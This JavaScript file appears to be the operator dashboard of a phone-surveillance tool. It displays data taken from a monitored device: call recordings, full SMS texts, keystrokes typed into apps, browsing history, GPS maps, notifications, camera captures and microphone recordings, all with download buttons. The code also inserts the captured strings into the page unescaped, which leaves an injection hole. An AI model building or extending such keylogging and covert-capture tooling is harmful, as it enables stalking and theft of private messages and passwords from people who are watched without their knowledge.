// Enhanced Dashboard Display Functions
// This file contains improved display functions for all monitoring data

// Add Leaflet CSS and JS for maps (add to HTML head)
function loadMapLibrary() {
    if (!document.getElementById('leaflet-css')) {
        const css = document.createElement('link');
        css.id = 'leaflet-css';
        css.rel = 'stylesheet';
        css.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
        document.head.appendChild(css);
    }
    
    if (!window.L && !document.getElementById('leaflet-js')) {
        const script = document.createElement('script');
        script.id = 'leaflet-js';
        script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
        document.head.appendChild(script);
    }
}

// Enhanced activity display with full details
function displayActivitiesEnhanced(activities, containerId) {
    const container = document.getElementById(containerId);
    
    if (!activities || activities.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <div class="icon">📭</div>
                <p>No activities found</p>
                <small>Activities will appear here once monitoring starts</small>
            </div>
        `;
        return;
    }
    
    container.innerHTML = activities.map((activity, index) => {
        const icon = ACTIVITY_ICONS[activity.activity_type] || '📱';
        const label = ACTIVITY_LABELS[activity.activity_type] || activity.activity_type;
        const time = new Date(activity.timestamp).toLocaleString();
        const activityId = `activity-${index}-${activity.id || Date.now()}`;
        
        let details = '';
        let expandedContent = '';
        let hasExpandedContent = false;
        
        if (activity.activity_data) {
            const data = typeof activity.activity_data === 'string' 
                ? JSON.parse(activity.activity_data) 
                : activity.activity_data;
            
            switch (activity.activity_type) {
                case 'call':
                    details = `${data.type || 'Unknown'} call ${data.number ? 'to/from ' + data.number : ''} - Duration: ${formatDuration(data.duration)}`;
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>Type:</strong> ${data.type || 'Unknown'}</div>
                            <div class="detail-row"><strong>Number:</strong> ${data.number || 'Unknown'}</div>
                            <div class="detail-row"><strong>Duration:</strong> ${formatDuration(data.duration)}</div>
                            <div class="detail-row"><strong>Time:</strong> ${time}</div>
                            ${data.contact_name ? `<div class="detail-row"><strong>Contact:</strong> ${data.contact_name}</div>` : ''}
                            ${data.call_recording_url ? `
                                <div class="detail-row">
                                    <strong>Recording:</strong>
                                    <audio controls style="width: 100%; margin-top: 10px;">
                                        <source src="${data.call_recording_url}" type="audio/3gpp">
                                        Your browser does not support audio playback.
                                    </audio>
                                </div>
                            ` : ''}
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                case 'sms':
                    const messagePreview = data.message || data.body || '';
                    details = `${data.type || 'Unknown'} ${data.sender ? 'from ' + data.sender : data.recipient ? 'to ' + data.recipient : ''}: ${messagePreview.substring(0, 50)}${messagePreview.length > 50 ? '...' : ''}`;
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>Type:</strong> ${data.type || 'Unknown'}</div>
                            <div class="detail-row"><strong>${data.type === 'received' ? 'From' : 'To'}:</strong> ${data.sender || data.recipient || 'Unknown'}</div>
                            <div class="detail-row"><strong>Time:</strong> ${time}</div>
                            <div class="message-content">
                                <strong>Full Message:</strong>
                                <div class="message-text">${messagePreview || 'No message content'}</div>
                            </div>
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                case 'app_usage':
                    details = `App: ${data.appName || data.packageName || 'Unknown'} - Usage: ${formatDuration(data.duration || data.foregroundTime)}`;
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>App Name:</strong> ${data.appName || 'Unknown'}</div>
                            <div class="detail-row"><strong>Package:</strong> ${data.packageName || 'Unknown'}</div>
                            <div class="detail-row"><strong>Usage Time:</strong> ${formatDuration(data.duration || data.foregroundTime)}</div>
                            <div class="detail-row"><strong>Last Used:</strong> ${time}</div>
                            ${data.launchCount ? `<div class="detail-row"><strong>Launch Count:</strong> ${data.launchCount}</div>` : ''}
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                case 'web_activity':
                    details = `${data.title || 'Webpage'}: ${data.url || 'Unknown URL'}`;
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>Title:</strong> ${data.title || 'Unknown'}</div>
                            <div class="detail-row"><strong>URL:</strong> <a href="${data.url}" target="_blank" rel="noopener">${data.url || 'Unknown'}</a></div>
                            <div class="detail-row"><strong>Browser:</strong> ${data.browser || 'Unknown'}</div>
                            <div class="detail-row"><strong>Visit Time:</strong> ${time}</div>
                            ${data.visitCount ? `<div class="detail-row"><strong>Visit Count:</strong> ${data.visitCount}</div>` : ''}
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                case 'location':
                    details = `${data.address || `Lat: ${data.latitude}, Lng: ${data.longitude}` || 'Unknown location'}`;
                    expandedContent = `
                        <div class="expanded-details">
                            ${data.address ? `<div class="detail-row"><strong>Address:</strong> ${data.address}</div>` : ''}
                            ${data.city ? `<div class="detail-row"><strong>City:</strong> ${data.city}</div>` : ''}
                            ${data.country ? `<div class="detail-row"><strong>Country:</strong> ${data.country}</div>` : ''}
                            <div class="detail-row"><strong>Coordinates:</strong> ${data.latitude}, ${data.longitude}</div>
                            <div class="detail-row"><strong>Accuracy:</strong> ${data.accuracy ? data.accuracy.toFixed(2) + 'm' : 'Unknown'}</div>
                            <div class="detail-row"><strong>Time:</strong> ${time}</div>
                            <div class="map-container" id="map-${activityId}" style="height: 300px; margin-top: 15px; border-radius: 8px; overflow: hidden;"></div>
                            <script>
                                setTimeout(() => {
                                    if (window.L) {
                                        const map = L.map('map-${activityId}').setView([${data.latitude}, ${data.longitude}], 15);
                                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                                            attribution: '© OpenStreetMap contributors'
                                        }).addTo(map);
                                        L.marker([${data.latitude}, ${data.longitude}]).addTo(map)
                                            .bindPopup('${data.address || 'Location'}').openPopup();
                                    }
                                }, 100);
                            </script>
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                case 'keyboard_input':
                    const inputText = data.inputText || data.text || '';
                    const appName = data.appName || (data.packageName ? data.packageName.split('.').pop() : 'Unknown');
                    details = `App: ${appName} - Input: ${inputText.substring(0, 30)}${inputText.length > 30 ? '...' : ''}`;
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>App:</strong> ${appName}</div>
                            <div class="detail-row"><strong>Package:</strong> ${data.packageName || 'Unknown'}</div>
                            <div class="detail-row"><strong>Input Type:</strong> ${data.inputType || 'general'}</div>
                            <div class="detail-row"><strong>Time:</strong> ${time}</div>
                            <div class="message-content">
                                <strong>Typed Text:</strong>
                                <div class="message-text">${inputText || 'No text captured'}</div>
                            </div>
                            ${data.hint ? `<div class="detail-row"><strong>Field Hint:</strong> ${data.hint}</div>` : ''}
                            ${data.contentDescription ? `<div class="detail-row"><strong>Context:</strong> ${data.contentDescription}</div>` : ''}
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                case 'notification':
                    details = `${data.appName || data.packageName || 'App'}: ${data.title || ''} - ${(data.text || '').substring(0, 40)}${(data.text || '').length > 40 ? '...' : ''}`;
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>App:</strong> ${data.appName || data.packageName || 'Unknown'}</div>
                            <div class="detail-row"><strong>Time:</strong> ${time}</div>
                            <div class="notification-content">
                                <div class="notification-title"><strong>${data.title || 'Notification'}</strong></div>
                                <div class="message-text">${data.text || 'No content'}</div>
                            </div>
                            ${data.action ? `<div class="detail-row"><strong>Action:</strong> ${data.action}</div>` : ''}
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                case 'camera':
                    details = `Camera ${data.event || 'used'} - ${data.appName || 'Unknown app'}`;
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>Event:</strong> ${data.event || 'Unknown'}</div>
                            <div class="detail-row"><strong>App:</strong> ${data.appName || 'Unknown'}</div>
                            <div class="detail-row"><strong>Time:</strong> ${time}</div>
                            ${data.image_url ? `
                                <div class="media-preview">
                                    <img src="${data.image_url}" alt="Camera capture" style="max-width: 100%; border-radius: 8px; margin-top: 10px;" onclick="openImageViewer('${data.image_url}')">
                                    <button onclick="openImageViewer('${data.image_url}')" class="btn btn-sm" style="margin-top: 10px;">View Full Size</button>
                                </div>
                            ` : ''}
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                case 'mic':
                case 'call_recording':
                    details = `Audio recording - ${data.duration ? formatDuration(data.duration) : 'Unknown duration'}`;
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>Duration:</strong> ${data.duration ? formatDuration(data.duration) : 'Unknown'}</div>
                            <div class="detail-row"><strong>Time:</strong> ${time}</div>
                            ${data.audio_url ? `
                                <div class="media-preview">
                                    <audio controls style="width: 100%; margin-top: 10px;">
                                        <source src="${data.audio_url}" type="audio/3gpp">
                                        <source src="${data.audio_url}" type="audio/mpeg">
                                        Your browser does not support audio playback.
                                    </audio>
                                    <button onclick="downloadMedia('${data.audio_url}', 'recording.3gp')" class="btn btn-sm" style="margin-top: 10px;">Download Audio</button>
                                </div>
                            ` : ''}
                        </div>
                    `;
                    hasExpandedContent = true;
                    break;
                    
                default:
                    details = JSON.stringify(data).substring(0, 100) + '...';
                    expandedContent = `
                        <div class="expanded-details">
                            <div class="detail-row"><strong>Time:</strong> ${time}</div>
                            <div class="message-content">
                                <strong>Raw Data:</strong>
                                <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto;">${JSON.stringify(data, null, 2)}</pre>
                            </div>
                        </div>
                    `;
                    hasExpandedContent = true;
            }
        }
        
        return `
            <div class="activity-item ${hasExpandedContent ? 'expandable' : ''}" onclick="${hasExpandedContent ? `toggleActivityDetails('${activityId}')` : ''}">
                <div class="activity-icon">${icon}</div>
                <div class="activity-info">
                    <div class="activity-type">${label}</div>
                    <div class="activity-details">${details}</div>
                    <div class="activity-time">${time}</div>
                </div>
                ${hasExpandedContent ? '<div class="expand-indicator">▼</div>' : ''}
            </div>
            <div id="${activityId}" class="activity-expanded" style="display: none;">
                ${expandedContent}
            </div>
        `;
    }).join('');
    
    // Load map library if needed
    loadMapLibrary();
}

// Toggle activity details
function toggleActivityDetails(activityId) {
    const expandedDiv = document.getElementById(activityId);
    const activityItem = expandedDiv.previousElementSibling;
    const indicator = activityItem.querySelector('.expand-indicator');
    
    if (expandedDiv.style.display === 'none') {
        expandedDiv.style.display = 'block';
        activityItem.classList.add('expanded');
        if (indicator) indicator.textContent = '▲';
    } else {
        expandedDiv.style.display = 'none';
        activityItem.classList.remove('expanded');
        if (indicator) indicator.textContent = '▼';
    }
}

// Format duration helper
function formatDuration(seconds) {
    if (!seconds || seconds === 'Unknown') return 'Unknown';
    
    const sec = parseInt(seconds);
    if (isNaN(sec)) return seconds;
    
    const hours = Math.floor(sec / 3600);
    const minutes = Math.floor((sec % 3600) / 60);
    const secs = sec % 60;
    
    if (hours > 0) {
        return `${hours}h ${minutes}m ${secs}s`;
    } else if (minutes > 0) {
        return `${minutes}m ${secs}s`;
    } else {
        return `${secs}s`;
    }
}

// Open image viewer in modal
function openImageViewer(imageUrl) {
    const modal = document.createElement('div');
    modal.className = 'image-viewer-modal';
    modal.innerHTML = `
        <div class="image-viewer-overlay" onclick="this.parentElement.remove()"></div>
        <div class="image-viewer-content">
            <button class="close-btn" onclick="this.closest('.image-viewer-modal').remove()">✕</button>
            <img src="${imageUrl}" alt="Full size image">
            <div class="image-viewer-actions">
                <button onclick="downloadMedia('${imageUrl}', 'image.jpg')" class="btn">Download</button>
                <button onclick="window.open('${imageUrl}', '_blank')" class="btn">Open in New Tab</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

// Download media file
function downloadMedia(url, filename) {
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.target = '_blank';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

// Enhanced media gallery with proper viewers
function displayMediaGalleryEnhanced(activities) {
    const container = document.getElementById('mediaGallery');
    
    if (!activities || activities.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <div class="icon">📷</div>
                <p>No media files found</p>
                <small>Photos and audio recordings will appear here</small>
            </div>
        `;
        return;
    }
    
    container.innerHTML = activities.map((activity, index) => {
        const time = new Date(activity.timestamp).toLocaleString();
        const data = typeof activity.activity_data === 'string' 
            ? JSON.parse(activity.activity_data) 
            : activity.activity_data;
        
        let mediaHtml = '';
        let mediaType = '';
        
        if (activity.activity_type === 'camera' && data.image_url) {
            mediaType = 'image';
            mediaHtml = `
                <div class="media-thumbnail" onclick="openImageViewer('${data.image_url}')">
                    <img src="${data.image_url}" alt="Camera capture" loading="lazy">
                    <div class="media-overlay">
                        <span>📷 Click to view</span>
                    </div>
                </div>
            `;
        } else if ((activity.activity_type === 'mic' || activity.activity_type === 'call_recording') && data.audio_url) {
            mediaType = 'audio';
            mediaHtml = `
                <div class="media-audio">
                    <div class="audio-icon">🎵</div>
                    <audio controls style="width: 100%;">
                        <source src="${data.audio_url}" type="audio/3gpp">
                        <source src="${data.audio_url}" type="audio/mpeg">
                    </audio>
                </div>
            `;
        } else {
            mediaType = 'unknown';
            mediaHtml = `
                <div class="media-placeholder">
                    <div class="placeholder-icon">${ACTIVITY_ICONS[activity.activity_type] || '📱'}</div>
                    <div>No media available</div>
                </div>
            `;
        }
        
        return `
            <div class="media-item ${mediaType}">
                ${mediaHtml}
                <div class="media-info">
                    <strong>${ACTIVITY_LABELS[activity.activity_type] || activity.activity_type}</strong>
                    <small>${time}</small>
                    ${data.image_url ? `<button onclick="downloadMedia('${data.image_url}', 'image-${index}.jpg')" class="btn btn-sm">Download</button>` : ''}
                    ${data.audio_url ? `<button onclick="downloadMedia('${data.audio_url}', 'audio-${index}.3gp')" class="btn btn-sm">Download</button>` : ''}
                </div>
            </div>
        `;
    }).join('');
}

// Export functions to global scope
window.displayActivitiesEnhanced = displayActivitiesEnhanced;
window.toggleActivityDetails = toggleActivityDetails;
window.openImageViewer = openImageViewer;
window.downloadMedia = downloadMedia;
window.displayMediaGalleryEnhanced = displayMediaGalleryEnhanced;
window.formatDuration = formatDuration;
window.loadMapLibrary = loadMapLibrary;
